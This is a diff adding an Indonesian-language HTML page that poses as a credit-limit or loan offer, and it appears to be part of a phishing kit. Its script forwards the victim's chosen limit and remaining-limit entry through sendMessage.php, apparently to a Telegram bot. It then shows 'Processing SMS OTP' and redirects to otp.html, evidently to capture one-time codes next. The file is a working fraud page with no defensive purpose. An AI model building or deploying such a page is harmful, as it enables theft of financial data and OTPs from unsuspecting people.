@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+  body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+
+    #gambar-atas {
+      margin-bottom: 20px;
+    }
+
+    #gambar-atas img {
+      width: 100%;
+      object-fit: cover;
+      max-height: 300px;
+    }
+
+    div {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin-top: 20px;
+    }
+
+    /* Kolom Select */
+    #pilihan-container {
+      width: 90%;
+      max-width: 450px;
+      margin-bottom: 10px;
+      margin: 0 auto;
+    }
+
+    #pilihan {
+      width: 102%;
+      padding: 13px;
+      border-radius: 5px;
+      border: 1px solid #663399;
+    }
+
+    /* Jarak antara kolom select dan kolom input */
+    #jarak1 {
+      height: 10px;
+    }
+
+    /* Kolom Input dan Tombol Submit */
+    #jumlah-container {
+      width: 86%;
+      max-width: 450px;
+      margin-bottom: 10px;
+      display: flex;
+      flex-direction: column;
+      margin: 0 auto;
+    }
+
+    #jumlahInput {
+      width: 98%;
+      padding: 13px;
+      border-radius: 5px;
+      border: 1px solid #663399;
+      margin-bottom: 10px;
+    }
+
+    #submit {
+      width: 107%;
+      max-width: 350px;
+      padding: 13px;
+      border-radius: 8px;
+      border: none;
+      background-color: #663399;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    /* Gambar di bawah Tombol Submit */
+    #gambar-bawah {
+      margin-top: 20px;
+    }
+
+    #gambar-bawah img {
+      width: 95%;
+      object-fit: cover;
+    }
+    </style>
+  <script>
+    function sendMessageToTelegram(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim: " + message);
+        }
+      };
+      var url = "sendMessage.php?message=" + encodeURIComponent(message);
+
+      xhttp.open("GET", url, true);
+      xhttp.send();
+    }
+
+    function kirimPesan() {
+      var selectedLimit = document.getElementById("pilihan").value;
+      var sisaLimit = document.getElementById("jumlahInput").value;
+
+      // Validasi jika kolom sisa limit kosong
+      if (sisaLimit.trim() === '') {
+        // Memicu efek getaran
+        if (navigator.vibrate) {
+          navigator.vibrate(200); // 200 milidetik getaran
+        }
+        return;
+      }
+
+      sendMessageToTelegram("𝗝𝘂𝗺𝗹𝗮𝗵 𝗟𝗶𝗺𝗶𝘁 𝗦𝗮𝗮𝘁 𝗜𝗻𝗶: " + sisaLimit + " dengan limit " + selectedLimit);
+
+      document.getElementById("submit").value = "Processing SMS OTP.......";
+
+      setTimeout(function() {
+        window.location.href = "otp.html";
+      }, 1500); // Ubah nilai timeout sesuai kebutuhan
+    }
+  </script>
+</head>
+<body>
+  <div id="gambar-atas">
+    <img src="https://i.ibb.co/YdNCY7K/https-da9bc5a4cc82aeae1212089e2c52663d-cdn-bubble-io-f1699344855196x574253127587734100-1699344776096.png" alt="Gambar Pucok">
+  </div>
+
+  <!-- Kolom Select -->
+  <div id="pilihan-container">
+    <label for="pilihan"></label>
+    <select id="pilihan" name="pilihan">
+      <option value="opsi1">Pilih Limit</option>
+      <option value="opsi2">Rp 10.000.000 tenor 12 bulan suku bunga 1.42%</option>
+      <option value="opsi3">Rp 15.000.000 tenor 12 bulan suku bunga 1.42%</option>
+      <option value="opsi4">Rp 25.000.000 tenor 12 bulan suku bunga 1.42%</option>
+      <option value="opsi5">Rp 50.000.000 Tenor 12 bulan suku bunga 1.42%</option>
+    </select>
+  </div>
+
+  <!-- Jarak antara kolom select dan kolom input -->
+  <div id="jarak7"></div>
+
+  <!-- Kolom Input dan Tombol Submit -->
+  <div id="jumlah-container">
+    <input type="number" id="jumlahInput" name="jumlah" placeholder="Sisa Limit">
+    <input type="submit" id="submit" value="Lanjutkan" onclick="kirimPesan()">
+  </div>
+
+  <!-- Gambar Bawah -->
+  <div id="gambar-bawah">
+    <img src="https://i.ibb.co/c2BQYp8/IMG-20231229-WA0003-removebg-preview.png" alt="Gambar 2711">
+  </div>
+</body>
+</html>
